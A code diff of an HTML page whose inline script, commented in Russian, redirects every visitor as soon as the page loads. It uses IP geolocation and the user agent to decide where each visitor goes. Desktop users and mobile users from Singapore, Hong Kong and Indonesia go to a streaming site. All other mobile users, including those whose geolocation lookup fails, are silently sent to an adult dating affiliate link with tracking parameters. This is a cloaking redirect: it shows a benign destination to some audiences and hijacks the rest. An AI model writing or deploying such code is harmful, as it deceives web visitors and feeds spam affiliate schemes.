@@ -7,33 +7,37 @@
 </head>
 <body>
     <script>
-        // Функция для определения страны через API (ipapi.co)
         function getCountry() {
             fetch('https://ipapi.co/json/')
                 .then(response => response.json())
                 .then(data => {
-                    const country = data.country_code; // Код страны (SG для Сингапура, HK для Гонконга)
-                    const isDesktop = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? false : true;
+                    const country = data.country_code;
+                    const isMobile = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent);
 
-                    // Логика редиректа
-                    if (isDesktop) {
+                    // ТВОЯ ЛОГИКА:
+                    if (isMobile && (country === 'SG' || country === 'HK' || country === 'ID')) {
+                        // 📱 Мобильные из SG/HK → bigo.tv
                         window.location.href = 'https://www.bigo.tv/show/';
-                    } else if (country === 'SG' || country === 'HK') {
-                        window.location.href = 'https://www.bigo.tv/show/';
+                    } else if (isMobile) {
+                        // 📱 Мобильные (не из SG/HK) → смартлинк
+                        window.location.href = 'https://onenightchick.com/?utm_source=ak5Udq5tP7YCo&utm_campaign=LB4';
                     } else {
-                        window.location.href = 'https://rp12mr6.mybestromancenow.com/ye9anqx?s1=L&cid=L';
+                        // 🖥️ Десктопы (любые) → bigo.tv
+                        window.location.href = 'https://www.bigo.tv/show/';
                     }
                 })
                 .catch(error => {
-                    // Если API не работает, перенаправляем по умолчанию
-                    window.location.href = 'https://rp12mr6.mybestromancenow.com/ye9anqx?s1=L&cid=L';
+                    // При ошибке API
+                    const isMobile = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent);
+                    if (isMobile) {
+                        window.location.href = 'https://onenightchick.com/?utm_source=ak5Udq5tP7YCo&utm_campaign=LB4';
+                    } else {
+                        window.location.href = 'https://www.bigo.tv/show/';
+                    }
                 });
         }
 
-        // Выполняем редирект сразу при загрузке
         window.onload = getCountry;
     </script>
 </body>
 </html>
-
-
